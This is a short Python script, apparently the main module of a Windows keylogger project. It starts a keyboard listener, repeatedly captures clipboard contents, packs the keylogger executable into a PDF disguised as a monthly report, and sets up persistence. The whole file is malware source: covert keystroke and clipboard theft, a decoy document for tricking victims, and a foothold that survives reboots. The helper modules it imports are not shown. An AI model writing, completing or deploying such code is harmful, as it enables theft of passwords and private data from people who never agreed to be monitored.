from pynput import keyboard
import schedule, time
from keylogger_core import on_press, capture_clipboard
from scripts.gerar_pdf_hibrido import gerar_pdf_hibrido
from scripts.setup_persistence import setup_persistence

def main():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    exe_path = "C:\\HacxLab\\keylogger_ai.exe"
    pdf_path = "C:\\HacxLab\\Relatorio_Mensal_AI.pdf"
    gerar_pdf_hibrido(exe_path, pdf_path)
    setup_persistence(exe_path)

    while True:
        capture_clipboard()
        schedule.run_pending()
        time.sleep(1)

if __name__ == "__main__":
    main()